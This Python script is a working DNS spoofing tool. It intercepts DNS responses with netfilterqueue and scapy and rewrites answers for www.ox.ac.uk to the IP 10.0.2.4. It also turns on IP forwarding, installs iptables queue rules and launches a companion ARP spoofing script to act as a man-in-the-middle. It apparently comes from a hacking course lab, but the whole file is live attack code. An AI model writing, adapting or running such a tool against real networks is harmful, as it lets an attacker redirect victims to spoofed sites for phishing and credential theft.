#!/usr/bin/env python

from netfilterqueue import NetfilterQueue as net
import scapy.all as scapy
from subprocess import call, Popen

count = 1
out_IP = "10.0.2.4"


def process_packet(pkt):
    scapy_pkt = scapy.IP(pkt.get_payload())
    # looking for a DNS response
    if scapy_pkt.haslayer(scapy.DNSRR):
        # accessing the request layer and inside the qname for the URL
        qname = scapy_pkt[scapy.DNSQR].qname
        if "www.ox.ac.uk." in qname:
            print(scapy_pkt.show())
            # rrname should be like the qname
            ans = scapy.DNSRR(rrname=qname, rdata=out_IP)
            # accesing the answer filed and make it equal to the answer that we want
            scapy_pkt[scapy.DNS].an = ans
            scapy_pkt[scapy.DNS].ancount = count
            del scapy_pkt[scapy.IP].len
            del scapy_pkt[scapy.IP].chksum
            del scapy_pkt[scapy.UDP].len
            del scapy_pkt[scapy.UDP].chksum
            pkt.set_payload(str(scapy_pkt))
            print("[+] Spoofing target complete!")

    pkt.accept()


def input_validation():
    answer = raw_input("Do you want the spoofer to be on your PC ? (y/Y/n/N)")
    while answer not in ["y", "Y", "N", "n"]:
        answer = raw_input("Error, do you want the spoofer to be on your PC ? (y/Y/n/N)")
    return answer


def run_own_pc():
    call(["sudo", "iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "1"])
    call(["sudo", "iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "1"])


def run_different():
    call(["sudo", "iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])


queue = net()
# the process_packet will be executed on each packet that we have
queue.bind(1, process_packet)
try:
    call(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])
    answer = input_validation()
    print(answer)
    if answer in ["y", "Y"]:
        run_own_pc()
    else:
        run_different()
        Popen(['xterm', '-e', 'sudo python3 arp_spoofing.py'])
    queue.run()
except KeyboardInterrupt:
    call(["sudo", "iptables", "--flush"])
    print('\n^C was detected, program exit!')
queue.unbind()
